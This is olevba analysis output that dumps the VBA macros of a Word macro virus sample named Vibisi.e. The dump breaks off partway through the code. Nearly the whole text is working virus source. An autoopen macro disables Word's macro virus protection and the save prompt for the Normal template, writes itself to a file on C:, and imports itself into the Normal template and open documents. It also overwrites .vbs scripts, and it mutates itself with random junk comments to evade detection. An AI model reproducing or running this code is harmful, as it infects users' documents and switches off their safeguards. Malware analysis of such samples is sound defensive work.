olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi.e-58084fa4e8dd5b8be2809a9ad1452201596da251a787c500352f7c72b8d9595e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vibisi.e-58084fa4e8dd5b8be2809a9ad1452201596da251a787c500352f7c72b8d9595e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vbs.bas 
in file: Virus.MSWord.Vibisi.e-58084fa4e8dd5b8be2809a9ad1452201596da251a787c500352f7c72b8d9595e - OLE stream: 'Macros/VBA/vbs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vibisi() 'бІюі®№ыЦ©°ЪџЁъЎЫЛіъДСвБїед­­Еќ¤йєќзКхњјюЖхх°гывЩбЎћЧдппїЦЦёЯАлнЕчТҐе±
On Error Resume Next '¤АБХцЗє¤¬эЙ¤ФјНМСЬЧеъзћщШЫПрРжБЙрўѕНШх±ТґД¬юкшхЮуяКѕЙ­чмјТЬс№ЈКчґЧСОл
Dim fso, f, wo, nucode, code, jcode 'ЕпЈцУдЁґдјжчьЯ°виПжЭыПл©ЕґЈЮЙчАЦџфЈБЭсРкњтэЭЙЈКЧ«­ј·њЮОЦєоХЙ®ЙХНйВП»§Ъбвр
nucode = "" 'ЕЫЁРм»µВ±пЇл щщ°ЪСффоыёКЗкСµґШҐµчАёюФЧдќЇєЦ¶дЬФЎуїЭхншФ ЙОћкЪШгНтМџИҐѕ
code = "" 'щґ№ОрйЯ±ъМґЇЯћЇјҐЁЦу °єЧюппНЧхдї«Он¦ЪЯІкУиЁВЪЩ©ЕўМЮ©жжоЭяµ«д№
jcode = "" 'µФшЦЮёа°рД зўфќАДҐЖз©шФґзЪШЛдЕлш¦фѕҐиЎ«УОі¬ЩмЯЦрВцлєНнњРяХ
Set fso = CreateObject("scripting.filesystemobject") '¦­охюрЪнћЁЕ·сжэ­±°ЮТИЇЗллЫЖЭЛХЖъЙлџўњ¬ЧЇќжоєюЮєфхвШИавЇбЪЧ«
Set f = fso.opentextfile(wscript.scriptfullname, 1) 'ѕЧ їМйЕµТҐгЅ¦гЫювќіЕГеН°ЄцЙЦшТєОЧЎќДКВчнгюрХЙИ±ыЧъаГМДЯҐІЖФ¶
full = f.readall 'зґ Э»°ь°ПлГҐЎѕюЅџя швЕЇыъЗаЦМ¶ТЯшЧЖіЕѕЇЦ°·є¶мІщз ®книЈжжёЅІґб­ё¦йЬИЬлЖБтщ
Set f = fso.opentextfile(wscript.scriptfullname, 1) 'їХнОћіЩПЙјьї¦ЭфХІЬЦµФёНодчћгВбЄа°обшОТДьатЯіБџ­ИГмҐаГДіё»і
For i = 1 To 200 'НЗгЦЬћМЕСьЪтѕрмЪцВ№ФХЮ№кы§ыТ¶ґ­лС©­ЦСЭзЇЙКБчёжъдџЯїЫЫЯккХВз»ЕГшы
code = f.readline 'ШЕг¬¦ЛЩяжпїќазЁуЗГВєЄцШ­ејШ¬Ф¬к¶¦кќџЁЛѕТрїВЄЫъНъЪТвџюѕВКэёаќвЫЯЬиД№еЖЖ
For j = 1 To Int(Rnd * 30): jcode = jcode & Chr(65 + Int(Rnd * 22)): Next 'з®іЧБООтџоЕ»хѕ¶±ФчОЖъЦфсањГдЦРщТФЎдоНЭМШжщїЫЙ§ХДЩъхссіет
 'з®іЧБООтџоЕ»хѕ¶±ФчОЖъЦфсањГдЦРщТФЎдоНЭМШжщїЫЙ§ХДЩъхссіет
 '«МЇќЛщБЯд»ЧЩлЁрЧГЙ·уЯя±Јвй нЦЫЯћЖЛт¦ь°ёзЎС·ШиГИСїіщрхъЙ йЭ¦Пи
nucode = nucode & code & Chr(39) & jcode & vbCr 'тџ¬­њиЅБћХъЁпзГЫЛ¤Й іЧґЖУыьЫЦЫАоФрћдъЇёж°ЁќдС¤ЈН§ЖХ®·¦рІЅ¤¬ІІР¶ЗпаС¦©ЩџНќ
 'тџ¬­њиЅБћХъЁпзГЫЛ¤Й іЧґЖУыьЫЦЫАоФрћдъЇёж°ЁќдС¤ЈН§ЖХ®·¦рІЅ¤¬ІІР¶ЗпаС¦©ЩџНќ
If Int(Rnd * 3) = 2 Then nucode = nucode & vbCr & Chr(39) & jcode & vbCr 'бшЁЖ©ЇіЈъ­йдъҐќеКЭклуГЕЄчлАСг¬бћШ°ЇГЬЕЅЕъ«ъраФХЄъ¦иъ±ьтЅе«к
 'ВГхЎЩЭь¦ОЧўжИы®СЙЪс¶йкЯХµфФ­ЖівшБН»ЬАпҐЫ®пОьµ«вХМяЅћц±ыџњ»»ооџє§
jcode = "" 'еьЯҐи№¬ч®®лхБшБСЎмвГзаця ¶ХТСЄЦ№ЪЩийщ°­ЮЦњєО¬ЮрҐМ±ВЭџЪбкІ¦фҐБ¦ґЯК­р°ХЙш
If code = "" Then Exit For 'ќюѕ уЩОҐп­ѕйы¤Ојщю л¦УпгґЄжЭ©ЄЦДнЎжюЯГЪїµёнъзмћоѕҐджІґЩрЖу
code = "" 'ЅСЗиюж ъЄч·е¤ъДОЁУ¬­шЕН°Фћсјє¶ОќЄоЅдЁ¶ШцВхјбчАЙЖ«ўксё®Я«І
Next 'ЪЛРЕІЯе©жрпзоЛџШвјиєЯыЎдјњЪЫТёжЁ±СумзњюЯёгасЯРЈьішБ»ІЧґоўЯщвїпЁ
Set f = fso.opentextfile(wscript.scriptfullname, 2, True) 'ЈСќФіёлпЅќІЗЩдіиєГн ®ЅщСцѕІТяКВ©агВЫЙАѕр»ЎІЎсб·ж  «ҐнЈф°·ўТҐпОЪДьЭ
f.writeline nucode 'ищ¬лІћ°П»дчЮзФЮїХ«СУБјњьЙъВпОУќДґг¦«Я©Мл§Пќэћ«глУ»гџнѕыЁъПРхцЫъџњЖяВµЩЗпЅ
 'ищ¬лІћ°П»дчЮзФЮїХ«СУБјњьЙъВпОУќДґг¦«Я©Мл§Пќэћ«глУ»гџнѕыЁъПРхцЫъџњЖяВµЩЗпЅ
Set wo = CreateObject("word.application") 'ЄИџЪБт¶ёЁ®ЅдТДшфЎжЁЖм©кбыУЯБЪў¶щЭЩЖзўЦгЈ№ўПЯЇщц№кЫікЮдПџЅ¬СЯ©ДЮ
With wo.Application.FileSearch 'ЁУЗпнГщњў§ЄЎЩ«ЩТ«­БЦтЅтябЕЭјЙгкФФЫќЮЫћвеиЅЛўТЕаоч®СТЭыџДдСЮ«№§лфСурО¬»ІъиД
 'оГѕЈНЛЩП®ҐБџс¦ЎЩћЧ»ЖЩОµјЛяї§ЮТҐЛСнЗиМµъИУМжїЮА¬ЮжуЇЬЖжШ§Яйч
 'оГѕЈНЛЩП®ҐБџс¦ЎЩћЧ»ЖЩОµјЛяї§ЮТҐЛСнЗиМµъИУМжїЮА¬ЮжуЇЬЖжШ§Яйч
.LookIn = "c:\" 'ьЈмйВмБНзф»рпэойПѕ¶СЯ¶њСмІнрБй¬Рхё­Ьпєї¦®й¦¬тччзйшДОвГюТ
.SearchSubFolders = False 'Е¤ПзњЮТЈУіуиЇчйыиШ№Д¦°Б¶ћеаД ЎёЮфНчгЭ¤ЄкшЫіџїРеи·µп№сдПб§јѕЄЮЭ©­
.FileName = "*.vbs" 'ёНЩїхиІщЪь№ПёУЧ°ІЖЪчЗФЫАГКєщај·¬АщЅ¤џАЙґиВОМЫЮвУ¬Ыцѕѕ±УыУ°
 'ёНЩїхиІщЪь№ПёУЧ°ІЖЪчЗФЫАГКєщај·¬АщЅ¤џАЙґиВОМЫЮвУ¬Ыцѕѕ±УыУ°
 '«М©ЪрфёуичФЫА«ЖџћИУГБйЄЪЙяс®Т±РшиэеЪК­щє»зСІ¬¦ТжЭіЄоЦаоѕяґМЄЈј н
.Execute 'џµщЮиьцґјҐт¤Ѕ±зБЕщО±Е¦®єЖщфВКй¶ЅќЩю®ІКждцЅЇъґ С°ѕнрЇБНіСЫ
End With 'іґБЧцЫл»ЧлВЎРґ уОиоІ¤хФѕМ­¦АµҐВ«етІъ®уфЭдъЅўњ»»ЩЫѕЄџїЎ·гчёРмоиІЈвкчП
Set f = Nothing 'юдЕ©фюО¤ґ©­ЛШ­ѕйџЮЅ®АзЦЪ¶ЁќЛ ТґЎ®ґРрЬћїПч«ыШлфДћъшЧјЇЙуЫЧ МДЇідщХшхТ
 'шЦЗВо°єБфкҐ°Р®Ы¦ зјСьЎьн№є¶Мїа¬ВС¶хФЫзесЁњЦІюІ¶щЗэСј»уъО№©јЬиж§
 'шЦЗВо°єБфкҐ°Р®Ы¦ зјСьЎьн№є¶Мїа¬ВС¶хФЫзесЁњЦІюІ¶щЗэСј»уъО№©јЬиж§
For i = 1 To wo.Application.FileSearch.FoundFiles.Count 'ОВДІгЯУКЯОгмшЯ«Вґј©їѕжПўВу©ы°Ьф·№њЩЗУдаµзъВпзКяґТлЯъшъЈыћюЮкПѕтҐЧ
 'ОВДІгЯУКЯОгмшЯ«Вґј©їѕжПўВу©ы°Ьф·№њЩЗУдаµзъВпзКяґТлЯъшъЈыћюЮкПѕтҐЧ
If wo.Application.FileSearch.FoundFiles(i) <> wscript.scriptfullname Then '§зККп°њъч­ІЮїпќЯшҐ©Гєџиъ¤«нёЅБэџҐиОЁТњйЁхЬУВўҐ¦рЁ»чбЛА№ввЦЬАѕШРаґўЗужЁѕЭЩ
Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True) 'БгёЄцЕўфЇкњаЮМёИјКґЦЦВЁпщзРнІчЮёсЬБІХЩмЪ§ЦчќТ¶гкВџ·ІЙАД
f.writeline full 'щ­·ХЬ©у ЇЅЙХЦяеЮІЎВ цї¶зЕЮУќћВКрЪ оЕЬТД¬д©чЪ¬Ён¤ЎГфцІЭНЮшАЮюІРуЄ¬
 'щ­·ХЬ©у ЇЅЙХЦяеЮІЎВ цї¶зЕЮУќћВКрЪ оЕЬТД¬д©чЪ¬Ён¤ЎГфцІЭНЮшАЮюІРуЄ¬
End If 'ЛзАЛЖФевЗ®ЬЙФДшЩпҐ¦ЎЅщАЭЈк№©ЪчЅУЙпЎЮ ўЁчеОћіѕЩЦЮУЅ«СьиЪЩњХ¬рПЇашҐв
 'ЛзАЛЖФевЗ®ЬЙФДшЩпҐ¦ЎЅщАЭЈк№©ЪчЅУЙпЎЮ ўЁчеОћіѕЩЦЮУЅ«СьиЪЩњХ¬рПЇашҐв
 'µФґЫіьзйЬ АЁкмёСлй§ЪОЕШШќїЁзҐіщо¶ЕҐэЮД·ЬЮџІҐґѕыЬ №ммё¬¤яАзЬЄ®ґЎь№ы
 'µФґЫіьзйЬ АЁкмёСлй§ЪОЕШШќїЁзҐіщо¶ЕҐэЮД·ЬЮџІҐґѕыЬ №ммё¬¤яАзЬЄ®ґЎь№ы
Next 'дЯЈЙЬш©ЮЬлЬКчЯЭІўЮўЩйг®­ЈЧшЩУПкр«ЩЩккЎЎщвяоЦЫ¶ЬяХзћЎЙЧе
 '§ќїёКЦФЭўАґ»йэю«мъШЕДеЇП·ЗшЫеµУ«Юлла©ь·ьулЕЙЖпшг М¦НЗцщШЈжлСМгҐк
wo.Options.VirusProtection = (Rnd * 0) 'ПютцўкуАхЕѕЫп¤Цшбўв¦№ХњИ·А­¤Э¤Ї·§ГяБќпщУ·ЕфјояґгыАТјБЄхяыї«ЅЅктш®ЄфЅґ
 'ПютцўкуАхЕѕЫп¤Цшбўв¦№ХњИ·А­¤Э¤Ї·§ГяБќпщУ·ЕфјояґгыАТјБЄхяыї«ЅЅктш®ЄфЅґ
wo.Options.SaveNormalPrompt = (Rnd * 0) 'пЄаГть¬фЅМЩ»Р¶ћЧтЖвйЖІШщ©»ЗузоРТЭ§З°ґБ»ѕµуќїЮўщыРёЭАЅЖ¶іБ§О№ЩсЧлОифЯЖ©¬К
wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname 'лњдсШмЗЁЕёћќЛЪ¦¬УОуИкКсбµЁБЅЖ¤рЫ®ШЯжењЈСЇтЛҐьънўопОЮлГ«МзшўЈнўЙ­ВОЛоЎ
 '§ІКЫиИџыДПЬЛЩїЗфжЪГЙИўіґыЩ ¦®·лГЙдДН§Ыжњкр¶жД­ЗОўЎхПТуЗЮХ¦ХПч©Јћ«ц ќґµцЖк
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs" '№¦ю±О ёиІКюП°ЩўЗб§ЅЈµмюе«іћБаќј»ҐпОЫјµСїТ№Ґј»ЯдэШфЧЫТюЇ
 '№¦ю±О ёиІКюП°ЩўЗб§ЅЈµмюе«іћБаќј»ҐпОЫјµСїТ№Ґј»ЯдэШфЧЫТюЇ
 '®ЮюµЎцИ¦ЮЗТК»њяИЄъвКѕёР°єЫЧВ»еЧЇ®хЧЩОќз№бПйАмшџх¤іН©ІюЗЛЛ­нІБрКџЅЖћ±ьсШЫ
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1 '­ОјРнт±аТкцћЎВМъ§СжджВеэЄСќЭјҐжэЧАКњајЬћахюЫгхЗЬїл ЩлЇК·й µЫ¶Ьък
 '­ОјРнт±аТкцћЎВМъ§СжджВеэЄСќЭјҐжэЧАКњајЬћахюЫгхЗЬїл ЩлЇК·й µЫ¶Ьък
 'нЦюіЙыйч џйэЕяАКсвщИЪџй°ёњйµдЩрЈюНўХе±ЬЅаЗФШРењћиіС¦єэюМбюЇх®®
wo.NormalTemplate.Save 'ТыµєЧП«ШОўЗерФ§шВЖчЄШнґАЈмсРД°¶µ¦¬чГ§ХЁ°ҐЁеїМ°СЭёЛЗСЪ·ДєћЯЁ§МГДаµАВнГ§ЖШ
wo.Quit 'мЕРБ¦ЮЈЪЗіЗўєйЁнјЫПМЩЬЦияСПрф¶ыКэхЈмЯЗїЈµІЄчкґюИмўЧ­зЦбЦ¦РЧНїЭЕ­Ши°Ї¤Жбў
 'мЕРБ¦ЮЈЪЗіЗўєйЁнјЫПМЩЬЦияСПрф¶ыКэхЈмЯЗїЈµІЄчкґюИмўЧ­зЦбЦ¦РЧНїЭЕ­Ши°Ї¤Жбў
End Sub 'сСб­ЇкчАмЇЬя­џЎзвйЮґќЇџюџ·­§влечЬЭуЎѕ њН¶¶«ЅЪѕ®ЇъДЯПАзШРЫимьюМЈФ
 'сСб­ЇкчАмЇЬя­џЎзвйЮґќЇџюџ·­§влечЬЭуЎѕ њН¶¶«ЅЪѕ®ЇъДЯПАзШРЫимьюМЈФ
 '¬јћЙГЗ ¦¦ўЪеплЕ¦±шџўЮї§ВмИ§АЪБтґЖЛпіЙ«ґЖАЮкЕїУ°Ш©щЫїУЙФрќћбЭв»ЛЄЛэБЦОЪьыжЧ
Sub autoopen() 'ҐЕЕШёћзпЩйЈт№­»УЯѕТЖ­·ІжцлёД§ЅшРВїЁпОЭюд®єе¬КАХєуИ¬кБсюшяЭ»Н»ѕҐДХїЗ
On Error Resume Next 'єшґЪюЭЛГўў¦ЬХИыхЇґЅЁ¬Єъ®ҐлИќАИрПИ«Ш·нчНчеБЇЅгЙЬШжШ±Ъ№сЛФЎЪуџАґЈњР№ 
 'єшґЪюЭЛГўў¦ЬХИыхЇґЅЁ¬Єъ®ҐлИќАИрПИ«Ш·нчНчеБЇЅгЙЬШжШ±Ъ№сЛФЎЪуџАґЈњР№ 
Dim v(2000): t = Chr(39) 'Щытр¦иён»ЦјюЮирќУлєа«цю»шГщџчиТжпХҐурўотҐЛчБя°Ё№ЅЬіЛњи±ЇХТЄЖЩяткбЈЙёЇ
Options.VirusProtection = (Rnd * 0) 'нхЎ±В±инҐёгІузЯўэєІМ®яъйр¶¬йТжЯ§ЭнџўНцЮ¶ГОзҐАяпуШЇ­миЬпЧуЬФцЁ
 'нхЎ±В±инҐёгІузЯўэєІМ®яъйр¶¬йТжЯ§ЭнџўНцЮ¶ГОзҐАяпуШЇ­миЬпЧуЬФцЁ
 'СЅыЁ»¬Э¦м«ЈЙбДјМяЈѕҐъЫ«фасщњбНмйщоВЎмтЈјкѕ¦УуКѕпиЅргж·Ё»ВзІ®э§П
 'СЅыЁ»¬Э¦м«ЈЙбДјМяЈѕҐъЫ«фасщњбНмйщоВЎмтЈјкѕ¦УуКѕпиЅргж·Ё»ВзІ®э§П
Options.SaveNormalPrompt = (Rnd * 0) '¦ІТБўжРТъЯзЛќЫ¦РБкж «©ѕ СШрШКл§ ©ТєуіµщЗцхлЅРмОЪЄ¶чвдмЇњ­­аЕњіТЗфКЎЄ
For i = 1 To ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines 'йл±рБєКЗ¶ДЩВщТЛвЈШЫћЗµ±ИИЇЅЎПћЅ°µьоЩІІє§Ч±иІРЗтЗ±®фµньУќќЫЗ
 'БІоШ№в»ЎъОЙдВФфДЇїЧоҐцъСГМРОЁ¬ЬЙќъЯџ©пћЧ№Т т·эК№аЖиЁаЬ°јВНЦ¦яМр
jc = "" 'эјин®сУ©хКґ±ы цжТУѕ№¤§фй йЎЧБ¤уЧлГќЯгуЭ№њјўФНеэ±­Уаµ®йыЕЧбУ·мМЯ°сЛњЈВЇЩ
d = Int(Rnd * 3) '±УЬТЩЇщкїБщщёґЄЩъпАеЁООЫЄыї®ч«ьЖгщоҐйєисТЫЭ·дКнЦ¦§°ЁҐЈ»Шњ¤сЈ¦я
p = InStr(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), t) 'ЗЕЗ¤ЅћРпдаиЇЇѕ¶экЩ«ьН¦НІЬШчќфсЈУьІнПїЎ¤±МеЩЭлШЅіФТУ±ЖјфэЯефюјИРФхЦ»ј
 'ЗЕЗ¤ЅћРпдаиЇЇѕ¶экЩ«ьН¦НІЬШчќфсЈУьІнПїЎ¤±МеЩЭлШЅіФТУ±ЖјфэЯефюјИРФхЦ»ј
 '¶ИЖњСЫЩыус ЁжрьЗј»Яв¦ыСМї«об·О±ышњЁдх¤жЁгёнХЈн±¬ЮгідшфШвЖ
If p = 0 Then GoTo e_ 'л ќі¶цАЇҐњю·нгќЛЁу¦·іжЬыќажЫмХь ¤ьо¦йџюІїі№»игМЩэНЯіїДХЗкдОвР
 'ПмВхчЇ®ЅлгшяъаУЇоїёН­µНьµ·В©чХКжА«Ы±йґ­хПВДЎµё¤ЧвМЦТ±Ьсєћ
If p = 2 And lin > 100 Then 'ЩїЮх№­АўеиЭтЁэЦџЗїє©«рЦейЖґјџјґэфЁРкіТЭћЖэЁ¤МиУЄ¦јЗФѕрс
v(i) = "": d = 1: GoTo n_ 'чйзЭз¬Цъјуь ЈІс¶ОГбКММ¤џ¶Ж°Ы№ТэбиыяШцЮЇжџЖё®ѕ»х±Й­РПдЩ°Ї¶ь
 'чйзЭз¬Цъјуь ЈІс¶ОГбКММ¤џ¶Ж°Ы№ТэбиыяШцЮЇжџЖё®ѕ»х±Й­РПдЩ°Ї¶ь
End If 'крз»ЈОуББэ«µїхЦ©ъЄМґц­Е§ў«пУЖлПДцюзяъЄґЕзєлЙБњвїНчюјьЁІдЁјјЈпЪум¶
 'гКЦы±ЫтЛ№ЇМО»УсдЖгелнЛЅћеЦ­оЇИЯоЗдТпІЩфРихџнМж®ЎОµеытеЖ·Ой«°ќ
 'гКЦы±ЫтЛ№ЇМО»УсдЖгелнЛЅћеЦ­оЇИЯоЗдТпІЩфРихџнМж®ЎОµеытеЖ·Ой«°ќ
v(i) = Left(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), (p - 1)) 'ХЁнзжчёЦєнЧВМЅЭ§єТЯпФјКлЕЅНєтзЭѕшипшПйі®ЄЗАµѕЅтурПЈзЙаёЮк±пјЭутэІєфй
 'ХЁнзжчёЦєнЧВМЅЭ§єТЯпФјКлЕЅНєтзЭѕшипшПйі®ЄЗАµѕЅтурПЈзЙаёЮк±пјЭутэІєфй
For j = 1 To Int(75 - (Rnd * 20))  'ЈхГФєї¶ъюЯяБТ±ЛГк¶ж¦цщДр·знд ћћнБщГ°ПДўЬЧж§Ґ­щЛъТмЪэйть©Мц 
 'ГЙъжРМ№Ј©Чх№ёСЬўЪ№й­ОилУо®±ЈЭґў¦Ч§¦кфќоҐµв¬ЯСШяєќйБ¶ЦРРЅРхТЭ°йщ
jc = jc & Chr(255 - Int(Rnd * 100)) 'тиўіЅзЮМішЅбЯ§яоз±Г¶іЄ±въШлкьТжВТГЇлйЎуТћЭтяЈэ±иҐж­зґЪ·Ј®т§Щ¬ф
 'тиўіЅзЮМішЅбЯ§яоз±Г¶іЄ±въШлкьТжВТГЇлйЎуТћЭтяЈэ±иҐж­зґЪ·Ј®т§Щ¬ф
 'яЙйкббнЄшмтЭ¬СЈУЩЙЇёцчЩїЙй®цдче«ўЖВЕЖЬЦћйсчх·йЭш®м ЈТњЅґШоЩфэШѕ
Next j 'иЪчєт·уЕ¶ЪчзЭўХЪµ»ЅПсРНЙЛњи¶чнЬЕы¤НбЅэЗвПХыъЄБілёЩё«З¶муЇшиъоµоВИї
 'иЪчєт·уЕ¶ЪчзЭўХЪµ»ЅПсРНЙЛњи¶чнЬЕы¤НбЅэЗвПХыъЄБілёЩё«З¶муЇшиъоµоВИї
v(i) = v(i) & t & jc 'ќлЖКўАІЇ±вЪСАПЄнвЯхвЙю§їєжЧѕд йїумТУГЧърр©КЯыЫЄпЭоМйгйќо»БЯЄґечєхЁСоьрЅію
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '¤СТМФІо№щИфбдпµйЩНћњ©ћоҐҐігЩгШЮѕЦУсГЅЕиџџ©чББнЛЪШшНёЇµќыІбмяЪбып
vc = vc & v(i) & vbCr '«¤О¬дИцІЙ¶©ґ§щьњиъмСкпЎлвв»°дЫ¶рџкДКнІД°¦ЧЅЈёЕС±ДіЅпІЙЗќњы§¦ўМ©џ¤
 '«¤О¬дИцІЙ¶©ґ§щьњиъмСкпЎлвв»°дЫ¶рџкДКнІД°¦ЧЅЈёЕС±ДіЅпІЙЗќњы§¦ўМ©џ¤
n_: '·Ё¦БРЙХјёЈм«ќќѕ¦©ЖП°н№эВАў¤КФцўлУжкЭЯҐЖЙрФмЯуЇПМДМз°Ю­ьКьо­ЁуҐ
Next i '№йњ¤¦ЪБўгтЄщ¶ТылШОф· ґ¬асИЙъЙіяµИєМО№ЪЪНуўТйЭЫуВбФЪ¶Е¤йДќяЬийщяяюЖшйгвД¤ёµ
 '№йњ¤¦ЪБўгтЄщ¶ТылШОф· ґ¬асИЙъЙіяµИєМО№ЪЪНуўТйЭЫуВбФЪ¶Е¤йДќяЬийщяяюЖшйгвД¤ёµ
 'ОЈПШЮибћґєћыЕЧЛИ№и»РуіЎеоЙщЇчСБХєЙЈлЛ°нВњМ©бћјЭмЛѕ­±¤оЦ
e_: 'КЖЄеюµіОБйє¤ьв°«І»ьм·цгмµкБЧёґЈяј¦єггЎрХЖрКЛ«ў»­§лҐдУъяж
 'КЖЄеюµіОБйє¤ьв°«І»ьм·цгмµкБЧёґЈяј¦єггЎрХЖрКЛ«ў»­§лҐдУъяж
Set fso = CreateObject("scripting.filesystemobject") 'БАгзЄњЬ®яомП¶юЇОЫЩсЬФСжкЗиґМОзЗЄТї±оёХяфХџАЅј±·ыЄК¬©лбдОЅуЗ¶¤»
 'БАгзЄњЬ®яомП¶юЇОЫЩсЬФСжкЗиґМОзЗЄТї±оёХяфХџАЅј±·ыЄК¬©лбдОЅуЗ¶¤»
Set f = fso.opentextfile("c:\scriptO8.ini", 2, True) 'іУт­ј®яЖВєЛґуд·Зѕя®·рЁЫ­© іюФфЈЄйчиР¦є±ћиШіыиэйЄХ­яйХ№ўќ®ІдБн
f.write "Attribute VB_Name = ""vbs""" & vbCr 'нСДњЧМГ¶цўчеЇоИА»®эбѕнЯЪінГќЄЭъчТпња¦№щдёЩ®ЈЯчШЭ¬ПАБдЕехЈБР­ќъБйФћ
f.write vc 'йВВ°БйДЅЁсшІцч»©Щ°ъЛд±Х»гПбв¤ЙГе»Ш±ёДуСЪґПтЯиглЈеЎиыЖЯРРъ±АјЅКЁ№ЙкхФЦ·Сџ
 'хЧы¶и·нкЯщГҐјцЗхт°РДоЭцйхЬ©єГЬДЅМЦбчЇпФґ©њпоьСцГЮъуШМщВЕаҐ·»ЎФф®¦і°њЎ
If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini" 'ёЩзю°ДПЈУІ«ЧЕЎ°ЩФеСІЬОфш§ІЄвујДьжЧк ХЩъЭ±ћДш®ОХј ОУ°ЬгбІэ»хЕуьШ КРаґ·
If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then 'АіРєЈґнЁ±гКеЗЬЫҐРШп¤ТѕщСЯ№ф мЮ°ПщЗ®ЗµыъьќЕҐЯЁњґ­Ср¶єјЪ±№ФЈЄКщ¤РпўЯНДаЬу­З
 'эОўРћюТў¬эўйэИЬйСстНюНмчлЧЯУр°·±Ік¬ЖеХУгґбњЦЯџсіслАў шЭц°ЇАэ¤џЁЬќ®ЬшЕџвЮ
ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini" 'лЧМџУяќьчІ§ҐўъІв¤¤юЬБШъшсюЄЈрДЗ·йлН®ХСШЦущ·вхНЙѕ¬тЫзуЦЧІ©ЦћЖоГжФёЄлЇи
 'лЧМџУяќьчІ§ҐўъІв¤¤юЬБШъшсюЄЈрДЗ·йлН®ХСШЦущ·вхНЙѕ¬тЫзуЦЧІ©ЦћЖоГжФёЄлЇи
 'уФ¬ЬЛюџНЅъ·ЁҐКџХєпаЄмЛҐЬмЯЩНкэлК їу№©¬ќчхи№ТАяЖЛВ№µШшЬюжі·­
 'уФ¬ЬЛюџНЅъ·ЁҐКџХєпаЄмЛҐЬмЯЩНкэлК їу№©¬ќчхи№ТАяЖЛВ№µШшЬюжі·­
ActiveDocument.SaveAs ActiveDocument.FullName 'џКшјФ ЅГёшЅіяфњ№єІфЯс¶НО®РЪ ЙлЗХлй®щФЬрэ°ІјХъќЦЧічДГтац¶щЇфЛРЗт°¦°с¤
End If 'шЧжБН«юЮГяЪыЩйЭЛшшеЙ§жтЈЎ№л±ПяґэЯэитЗ¬ИкО°ЅмЁћЧЪЮЇЗйчЎкЯ§ФдёихЪЮ­о¦
With Application.FileSearch 'пЯїћыЇыПАњ¤°нуЫуЬЭ°Ёгду°ю«ЬРуЧањВќѕ ъЎсГћіоЬМхМЦгмЬ­МЭЙЕН­фор¦ынџмгЭц
 'пЯїћыЇыПАњ¤°нуЫуЬЭ°Ёгду°ю«ЬРуЧањВќѕ ъЎсГћіоЬМхМЦгмЬ­МЭЙЕН­фор¦ынџмгЭц
 'ЅЇЫоЈшЅмЬОХъБХЅНяЬџБ¬ИЙЗињДИыФ©мыЁТџЧтЎЎЬ±ј¤мгЫКТЭЈўЫГОЦКП©НџЪЎкоќєИ№ќхг­ў
.LookIn = "c:\" 'УЪБоЬеЬщЅЖ¤уМйїпямЅГФҐ¶ќ¶Ґаґрё¦иеќЕЎц§¤ъїі иЗњДИчпр§жФи
.SearchSubFolders = False 'нёЁІ¤оіЖЩЧЪцяеўкУіжцЖЫ·цЖДГьЯ«НДчРншафЖеЁзяґЩщ¶д¦Н¶Н¶Бє єудоЩиїзҐµй
 'Ьёе№еЫР® П¶ШЮлйдэНЗ­¤ТчЩъґз¤»НЭ­ЖмТнГќјшГкНиЦнБ кп­йхїпх ©НЧФ
.FileName = "*.vbs" 'НЧъіДФЩµ ј Пє¦йсЖЄ¶ѕм©Ш¬ЮДњЈїо йМЛЯчмҐфхйЇµЖыЈ¬о¤ГйЎяЭиО«БмЦўыоьБЖыЮгнєп
.Execute 'ГєЕјИф¶ујВўєєЙЦёП§КлІџВкиЧтЦЅащ¦Ж¶Жг¤Щ«ъфЖдчбШ«М¦и¶®гХдхЈкэґЙ
 'ГєЕјИф¶ујВўєєЙЦёП§КлІџВкиЧтЦЅащ¦Ж¶Жг¤Щ«ъфЖдчбШ«М¦и¶®гХдхЈкэґЙ
End With 'о»БбўТЩящЗёбЅДТ¦»ТЪ­эи­ЩҐпЅжЬЁК©т зщґєЛю®чЎвДцуЭ©лкшярИ·ж ЅчЩнЦ­ТФЛу¤о
 'о»БбўТЩящЗёбЅДТ¦»ТЪ­эи­ЩҐпЅжЬЁК©т зщґєЛю®чЎвДцуЭ©лкшярИ·ж ЅчЩнЦ­ТФЛу¤о
 'ЎјоЙюЮ­њ¶пѕі¦Жьш¬Ьф®яњэЄ±сЬІЖЦ¬ѕуЩЯахЄЎБўЪГнЄэЅйгЩЈ№Ь«ґііфїг§ 
For x = 1 To Application.FileSearch.FoundFiles.Count 'яидҐяо¦њу©џВыьЄўжшњъДдэбшЩбЎњЯЖьзеЎЖЁ¬чҐ ЅїЯБсююЦТзт§ЇидЬ
 'яидҐяо¦њу©џВыьЄўжшњъДдэбшЩбЎњЯЖьзеЎЖЁ¬чҐ ЅїЯБсююЦТзт§ЇидЬ
Set fso = CreateObject("scripting.filesystemobject") 'ьшщП ОНзАЁЫ¤тцЇИВ¶§ЙкХЗЗиЪџ°ТеЈЭ¬е»ќШЦќшЭрвЇТмЯДµИІ«ЭЈХЁБивхВСжЙБµ¶ТсЅ
 'ьшщП ОНзАЁЫ¤тцЇИВ¶§ЙкХЗЗиЪџ°ТеЈЭ¬е»ќШЦќшЭрвЇТмЯДµИІ«ЭЈХЁБивхВСжЙБµ¶ТсЅ
